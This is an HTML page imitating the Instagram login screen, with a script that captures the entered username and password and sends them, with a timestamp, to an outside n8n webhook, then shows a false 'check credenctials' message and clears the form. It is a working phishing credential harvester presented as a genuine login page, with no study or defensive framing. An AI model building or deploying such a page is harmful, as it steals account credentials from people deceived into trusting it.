<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Instagram</title>

<style>
*{
  margin:0;
  padding:0;
  box-sizing:border-box;
  font-family: Arial, Helvetica, sans-serif;
}

body{
  background:#fafafa;
  display:flex;
  justify-content:center;
  align-items:center;
  height:100vh;
}

.container{
  width:350px;
}

.login-box{
  background:#fff;
  border:1px solid #dbdbdb;
  padding:40px;
  text-align:center;
}

.logo{
  font-family:'Brush Script MT', cursive;
  font-size:42px;
  margin-bottom:30px;
}

form{
  display:flex;
  flex-direction:column;
}

input{
  padding:10px;
  margin-bottom:8px;
  border:1px solid #dbdbdb;
  background:#fafafa;
  border-radius:3px;
  font-size:14px;
}

button{
  margin-top:10px;
  padding:8px;
  border:none;
  border-radius:8px;
  background:#0095f6;
  color:white;
  font-weight:bold;
  cursor:pointer;
}

button:hover{
  background:#0077cc;
}

#message{
  margin-top:10px;
  font-size:14px;
}
#forgetpassword{
    padding-top: 15px;
    color: #7d7b7be1;
    padding-bottom: 5px;
    font-size: 10px
}
#forgetpassword a{
    text-decoration: none;
}
</style>
</head>

<body>

<div class="container">

  <div class="login-box">
    <div class="logo">Instagram</div>

    <form id="loginForm">
      <input type="text" id="username" placeholder="Phone number, username, or email" required>
      <input type="password" id="password" placeholder="Password" required>
      <p id="forgetpassword">Forgot your login details? <a href="#">Get help logging in.</a></p>
      <button type="submit">Log In</button>
      <div id="message"></div>
    </form>
  </div>

</div>

<script>
document.getElementById("loginForm").addEventListener("submit", async function(e){
  e.preventDefault();

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;
  const message = document.getElementById("message");

  try {
    const response = await fetch("https://saidulupulipati.app.n8n.cloud/webhook/ae4648c9-9c97-4de2-acca-2c01e13df952", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        username: username,
        password: password,
        timestamp: new Date().toISOString()
      })
    });

    if(response.ok){
      message.style.color = "red";
      message.innerText = "check credenctials";
      document.getElementById("loginForm").reset();
    } else {
      message.style.color = "red";
      message.innerText = "error!";
    }

  } catch(error){
    message.style.color = "red";
    message.innerText = "incorrect username or password";
  }
});
</script>

</body>
</html>
